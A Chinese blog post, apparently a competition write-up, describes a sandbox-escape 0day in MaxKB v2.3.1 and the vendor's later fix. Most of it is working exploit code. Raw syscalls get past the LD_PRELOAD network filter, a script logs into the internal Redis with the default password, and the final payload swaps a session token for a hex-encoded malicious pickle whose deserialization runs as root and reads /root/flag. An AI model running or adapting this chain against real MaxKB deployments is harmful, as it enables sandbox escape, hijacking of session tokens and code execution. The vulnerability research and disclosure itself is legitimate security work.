---
title: "MaxKB v2.3.1 sandbox漏洞挖掘"
description: "MaxKB sandbox 漏洞挖掘记录，整理漏洞发现过程、利用条件和复现思路。"
pubDate: "2026-01-20"
updatedDate: "2026-01-20"
tags: ["沙箱逃逸", "漏洞挖掘", "Web安全"]
cover: auto
coverAlt: "MaxKB v2.3.1 sandbox漏洞挖掘 的文章封面"
draft: false
---
## MaxKB v2.3.1 sandbox漏洞挖掘

这个漏洞是在RCTF比赛中，题目所使用的开源MaxKB v2.3.1中挖到的非预期0day漏洞，以下是整个验证部分。

已知MaxKB v2.3.1比起上一版本修复了一个SSRF漏洞，同时对SSRF进行了拦截，主要依靠sandbox.c将工具中的python代码限制在沙箱中。

根据对sandbox.c和sanbox.so以及对.SANDBOX_BANNED_HOSTS的分析，我们发现，sandbox的网络拦截不全面，依旧存在SSRF漏洞，以下是漏洞挖掘过程和分析。

### 漏洞挖掘和分析

首先我们使用dockerfile开启一个docker靶机进行测试。

经过对sandbox.c的简单阅读，我们将docker靶机中的.SANDBOX_BANNED_HOSTS和sandbox.so文件给复制到我们的本地中，来用于辅助分析。

首先.SANDBOX_BANNED_HOSTS中存在如下内容，

```
127.0.0.1,localhost,host.docker.internal,maxkb,pgsql,redis,7b74845e3202,172.17.0.2
```

首先用ai写一个bash脚本进行分析，确定了sandbox.so的逻辑确实为samndbox.c和.SANDBOX_BANNED_HOSTS的逻辑实现，接下来，我们边进行逻辑分析。

将sandbox.c和.SANDBOX_BANNED_HOSTS让ai理出实现逻辑，下面贴上LLM的简单分析

```
这段代码实现了一个基于 LD_PRELOAD 的网络连接拦截器（沙盒），其主要功能是阻止程序访问特定的 IP 地址和域名。

核心机制

代码通过 LD_PRELOAD技术劫持了两个关键的系统调用，并在程序运行时动态检查连接目标是否在黑名单中。

拦截的具体内容

代码从两个层面进行拦截：

IP 地址拦截（connect函数）

时机：在程序通过 connect系统调用尝试建立 TCP 连接时触发。

检查对象：目标 sockaddr结构体中的 IP 地址（支持 IPv4 和 IPv6）。

行为：将目标 IP 与黑名单进行精确的正则匹配。如果匹配成功，则打印日志、设置 errno为 EACCES（权限不足）并返回 -1，从而阻止连接建立。

域名拦截（getaddrinfo函数）

时机：在程序通过 getaddrinfo库函数尝试解析域名时触发。

检查对象：传入的 node参数（通常是主机名或域名）。

关键设计：只拦截纯域名，不拦截已格式化的 IP 地址字符串。代码会先用 inet_pton判断 node是否为合法的 IP 字符串，如果是则跳过黑名单检查。

行为：对非 IP 的域名进行黑名单匹配。如果匹配成功，则打印日志并返回 EAI_FAIL，模拟 DNS 解析失败，从而阻止程序获取目标域名的 IP 地址。

黑名单配置

来源：从与当前动态链接库（.so文件）相同目录下的 .SANDBOX_BANNED_HOSTS文本文件中读取。

格式：黑名单内容为一个字符串，不同条目用逗号分隔。每个条目可以是一个具体的 IP（如 127.0.0.1）或域名（如 localhost），也可以是一个正则表达式（如 .*\.evil\.com$）。

匹配逻辑：使用正则表达式进行 ^pattern$形式的精确匹配，并忽略大小写。

总结

此代码片段构建了一个轻量级的应用层防火墙，通过劫持网络相关的系统调用和库函数，根据可配置的黑名单规则，在连接建立阶段和域名解析阶段对程序试图访问的特定网络目标（IP 和域名）进行阻断。代码末尾给出的示例黑名单 127.0.0.1,localhost,host.docker.internal,...即为会被拦截的目标。
```

显而易见，这个只hook了两个库函数，socket可以正常使用，所以我们尝试使用一个底层的方法来实现绕过，比如syscall。

到此为止我们的分析结束，在进行一个poc的验证，我们尝试连接Redis，并且依靠默认账号密码登录。

```python
import socket
import ctypes
import struct
import os

def bypass_ld_preload():
    libc = ctypes.CDLL(None, use_errno=True)
    SYS_SOCKET = 41
    SYS_CONNECT = 42
    AF_INET = socket.AF_INET
    SOCK_STREAM = socket.SOCK_STREAM

    # syscall 版本的 socket 和 connect
    def sys_connect(host, port):
        # 1. 通过 syscall 创建 socket
        fd = libc.syscall(SYS_SOCKET, AF_INET, SOCK_STREAM, 0)
        if fd < 0:
            return None, {"step": "socket", "errno": ctypes.get_errno()}
        
        # 2. 准备 sockaddr_in 结构
        sin_port = socket.htons(port)
        sin_addr = socket.inet_aton(host)
        packed = struct.pack("HH4s8x", AF_INET, sin_port, sin_addr)
        addr = ctypes.create_string_buffer(packed, len(packed))
        
        # 3. 通过 syscall 直接进行 connect
        ret = libc.syscall(SYS_CONNECT, fd, addr, ctypes.c_uint32(len(packed)))
        if ret != 0:
            err = ctypes.get_errno()
            os.close(fd)
            return None, {"step": "connect", "errno": err}
        
        # 4. 转换为 socket 对象并返回
        s = socket.fromfd(fd, AF_INET, SOCK_STREAM)
        os.close(fd)  # fromfd 会复制 fd，所以关闭原来的
        s.settimeout(3.0)
        return s, None

    def redis_login():
        # 连接到 Redis
        s, err = sys_connect("127.0.0.1", 6379)
        if s is None:
            return None, err
        
        try:
            # Redis 协议编码函数
            def enc(parts):
                buf = b"*" + str(len(parts)).encode() + b"\r\n"
                for p in parts:
                    if isinstance(p, str):
                        b = p.encode()
                    else:
                        b = p
                    buf += b"$" + str(len(b)).encode() + b"\r\n" + b + b"\r\n"
                return buf
            
            # 发送 AUTH 命令（使用默认密码）
            s.sendall(enc(["AUTH", "Password123@redis"]))
            
            # 接收响应
            data = b""
            while True:
                try:
                    chunk = s.recv(4096)
                except Exception:
                    break
                if not chunk:
                    break
                data += chunk
                if len(data) > 1024:
                    break
            
            return data, None
            
        finally:
            try:
                s.close()
            except Exception:
                pass
    
    # 执行 Redis 登录
    resp, err = redis_login()
    if resp is None:
        return {
            "status": "failure",
            "step": "connection",
            "error": err
        }
    
    # 解析响应
    response_text = resp.decode("latin1", "ignore").strip()
    
    if response_text.startswith("+OK"):
        return {
            "status": "success",
            "message": "Redis 登录成功",
            "response": response_text,
            "method": "syscall 绕过 LD_PRELOAD 拦截"
        }
    else:
        return {
            "status": "failure",
            "message": "Redis 登录失败",
            "response": response_text
        }

# 直接运行
if __name__ == "__main__":
    result = bypass_ld_preload()
    print("运行结果:")
    print(f"状态: {result['status']}")
    print(f"消息: {result['message']}")
    if 'response' in result:
        print(f"Redis 响应: {result['response']}")
    if 'error' in result:
        print(f"错误详情: {result['error']}")
    if 'method' in result:
        print(f"使用的方法: {result['method']}")
```

```python
{
  "status": "success",
  "message": "Redis 登录成功",
  "response": "+OK",
  "method": "syscall 绕过 LD_PRELOAD 拦截"
}
```

我们使用ai编写了一个脚本并成功实现了绕过，至此漏洞挖掘分析完成。

### 官方修复

官方在v2.4.0版本在sandbox.c中加入了以下内容

```c
long syscall(long number, ...) {
    // 检查系统调用号
    switch (number) {
        case SYS_execve:
        case SYS_execveat:
        case SYS_fork:
        case SYS_vfork:
        case SYS_clone:
        case SYS_clone3:
            if (!allow_create_subprocess()) return deny();
    }
    return real_syscall(number, ...);
}
static void ensure_config_loaded() {
    if (!banned_hosts) load_sandbox_config();
}
```

通过两个步骤封堵了预期的LD_PRELOAD注入，以及非预期的syscall绕过。

### 写题时的payload

```python
def pwn():
    import socket, ctypes, struct, os

    libc = ctypes.CDLL(None, use_errno=True)
    SYS_SOCKET = 41
    SYS_CONNECT = 42
    AF_INET = socket.AF_INET
    SOCK_STREAM = socket.SOCK_STREAM

    # -------- syscall 版 connect，复用你之前成功的写法 --------
    def sys_connect(host, port):
        fd = libc.syscall(SYS_SOCKET, AF_INET, SOCK_STREAM, 0)
        if fd < 0:
            return None, {"step": "socket", "errno": ctypes.get_errno()}
        sin_port = socket.htons(port)
        sin_addr = socket.inet_aton(host)
        packed = struct.pack("HH4s8x", AF_INET, sin_port, sin_addr)
        addr = ctypes.create_string_buffer(packed, len(packed))
        ret = libc.syscall(SYS_CONNECT, fd, addr, ctypes.c_uint32(len(packed)))
        if ret != 0:
            err = ctypes.get_errno()
            os.close(fd)
            return None, {"step": "connect", "errno": err}
        s = socket.fromfd(fd, AF_INET, SOCK_STREAM)
        os.close(fd)
        s.settimeout(3.0)
        return s, None

    # -------- Redis 命令：每次建立新连接 + AUTH --------
    def redis_cmd(args):
        s, err = sys_connect("127.0.0.1", 6379)
        if s is None:
            return None, err
        try:
            def enc(parts):
                buf = b"*" + str(len(parts)).encode() + b"\r\n"
                for p in parts:
                    if isinstance(p, str):
                        b = p.encode()
                    else:
                        b = p
                    buf += b"$" + str(len(b)).encode() + b"\r\n" + b + b"\r\n"
                return buf

            # 先 AUTH（官方镜像默认）
            s.sendall(enc(["AUTH", "Password123@redis"]))
            try:
                _ = s.recv(1024)
            except Exception:
                pass

            # 再发真正的命令
            s.sendall(enc(args))
            data = b""
            while True:
                try:
                    chunk = s.recv(4096)
                except Exception:
                    break
                if not chunk:
                    break
                data += chunk
                if len(data) > 65536:
                    break
            return data, None
        finally:
            try:
                s.close()
            except Exception:
                pass

    # 1. 找 :TOKEN:* 这个 key
    resp, err = redis_cmd(["KEYS", ":TOKEN*"])
    if resp is None:
        return {"ok": False, "stage": "keys", "error": err}
    txt = resp.decode("latin1", "ignore")
    pos = txt.find(":TOKEN:")
    if pos == -1:
        return {"ok": False, "stage": "no_token_key", "raw": txt[:200]}
    end = txt.find("\r\n", pos)
    if end == -1:
        return {"ok": False, "stage": "parse_key", "raw": txt[:200]}
    token_key = txt[pos:end]

    # key 类似 :TOKEN:<token_str>，取后半段当真正 token
    try:
        token_str = token_key.split(":TOKEN:", 1)[1]
    except Exception:
        return {"ok": False, "stage": "split_token", "token_key": token_key}

    # 2. 用恶意 pickle 覆盖这个 key 的 value
    # 载荷逻辑（在 Django / root 进程里反序列化执行）：
    #   data = open("/root/flag","r").read()
    #   open("/opt/maxkb-app/sandbox/pwned_flag","w").write(data)
    hex_payload = (
        "800595a0000000000000008c086275696c74696e73948c04657865639493948c"
        "84696d706f7274206275696c74696e732c6f730a64617461203d206275696c74"
        "696e732e6f70656e28222f726f6f742f666c6167222c227222292e7265616428"
        "290a6275696c74696e732e6f70656e28222f6f70742f6d61786b622d6170702f"
        "73616e64626f782f70776e65645f666c6167222c227722292e77726974652864"
        "617461290a94859452942e"
    )
    payload_bytes = bytes.fromhex(hex_payload)

    set_resp, err2 = redis_cmd(["SET", token_key, payload_bytes])
    if set_resp is None:
        return {"ok": False, "stage": "set_token", "error": err2}
    set_text = set_resp.decode("latin1", "ignore")[:100]

    # 3. syscall 打 8080，用 token 触发 Django 反序列化
    def http_trigger(path, header_line):
        s, err3 = sys_connect("127.0.0.1", 8080)
        if s is None:
            return {"path": path, "header": header_line.split(":", 1)[0], "error": err3}
        try:
            req = (
                "GET {p} HTTP/1.1\r\n"
                "Host: 127.0.0.1:8080\r\n"
                "{h}\r\n"
                "Connection: close\r\n\r\n"
            ).format(p=path, h=header_line)
            s.sendall(req.encode("ascii", "ignore"))
            data = b""
            while True:
                try:
                    chunk = s.recv(4096)
                except Exception:
                    break
                if not chunk:
                    break
                data += chunk
                if len(data) > 8192:
                    break
            line = data.split(b"\r\n", 1)[0].decode("latin1", "ignore")
            parts = line.split(" ")
            code = None
            if len(parts) >= 2 and parts[1].isdigit():
                code = int(parts[1])
            return {"path": path, "header": header_line.split(":", 1)[0], "status": code}
        finally:
            try:
                s.close()
            except Exception:
                pass

    headers = [
        "Authorization: " + token_str,
        "Authorization: Token " + token_str,
        "Cookie: token=" + token_str,
        "Cookie: auth=" + token_str,
    ]
    http_results = []
    for pth in ["/admin/", "/admin/api/workspace/current_user"]:
        for h in headers:
            http_results.append(http_trigger(pth, h))

    # 4. 读 root 进程写出来的 flag 文件
    flag_path = "/opt/maxkb-app/sandbox/pwned_flag"
    if os.path.exists(flag_path):
        try:
            with open(flag_path, "r") as f:
                flag = f.read().strip()
        except Exception as e:
            return {
                "ok": False,
                "stage": "read_flag_error",
                "flag_path": flag_path,
                "error": repr(e),
                "token_key": token_key,
                "token_str_head": token_str[:64],
                "set_reply": set_text,
                "http": http_results,
            }
        return {
            "ok": True,
            "stage": "done",
            "flag": flag,
            "token_key": token_key,
            "token_str_head": token_str[:64],
            "set_reply": set_text,
            "http": http_results,
        }
    else:
        return {
            "ok": False,
            "stage": "flag_not_written",
            "flag_path": flag_path,
            "token_key": token_key,
            "token_str_head": token_str[:64],
            "set_reply": set_text,
            "http": http_results,
        }
```

